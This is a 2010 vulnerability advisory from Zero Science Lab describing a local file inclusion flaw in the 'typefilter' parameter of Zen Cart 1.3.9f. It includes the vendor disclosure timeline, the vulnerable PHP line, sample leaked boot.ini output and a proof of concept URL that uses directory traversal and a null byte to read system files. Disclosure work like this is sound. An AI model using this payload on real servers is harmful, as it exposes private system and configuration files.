@@ -1,0 +1,82 @@
+Zen Cart v1.3.9f (typefilter) Local File Inclusion Vulnerability
+
+
+Vendor: Zen Ventures, LLC
+Product web page: http://www.zen-cart.com
+Version affected: 1.3.9f
+
+Summary: Zen Cart is an online store management system.
+It is PHP-based, using a MySQL database and HTML components.
+Support is provided for numerous languages and currencies,
+and it is freely available under the GNU GPL.
+
+Desc: Zen Cart v1.3.9f suffers from a file inlcusion vulnerability
+(LFI) / file disclosure vulnerability (FD) when input passed
+thru the "typefilter" parameter to index.php is not properly verified
+before being used to include files. This can be exploited to include
+files from local resources with directory traversal attacks and URL
+encoded NULL bytes.
+
+
+------------------ output. ------------------
+
+ [boot loader]
+ timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+
+ [operating systems]
+ multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /NoExecute=OptOut
+
+
+ 1065 Query was empty
+ in:
+ []
+
+------------------ .output ------------------
+
+
+ -
+
+
+------------------- snip. -------------------
+
+ if (isset($_GET['typefilter'])) $typefilter = $_GET['typefilter'];
+
+------------------- .snip -------------------
+
+
+
+Tested On: Apache 2.2.11 (Win32)
+           PHP 5.3.0
+           MySQL 5.1.36
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+Zero Science Lab - http://www.zeroscience.mk
+liquidworm gmail com
+
+19.08.2010
+
+
+Vendor status: [19.08.2010] - Vulnerability discovered.
+               [22.08.2010] - Vendor contacted.
+               [22.08.2010] - Vendor responds asking more details.
+               [23.08.2010] - Sent PoC files to vendor.
+               [25.08.2010] - Vendor confirms vulnerability.
+               [02.09.2010] - Asked vendor for patch release date.
+               [08.09.2010] - Vendor states approximately 7 days to patch release.
+               [20.09.2010] - Asked vendor for status.
+               [24.09.2010] - Asked vendor for status again because of no reply from previous mail.
+               [28.09.2010] - Vendor informed about advisory release date.
+               [29.09.2010] - Vendor releases version 1.3.9g to address this issue.
+               [01.10.2010] - Public advisory released.
+
+
+Advisory ID: ZSL-2010-4967
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4967.php
+
+Vendor Advisory: http://www.zen-cart.com/forum/showthread.php?t=165017
+
+
+PoC:
+
+ http://127.0.0.1/index.php?typefilter=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00
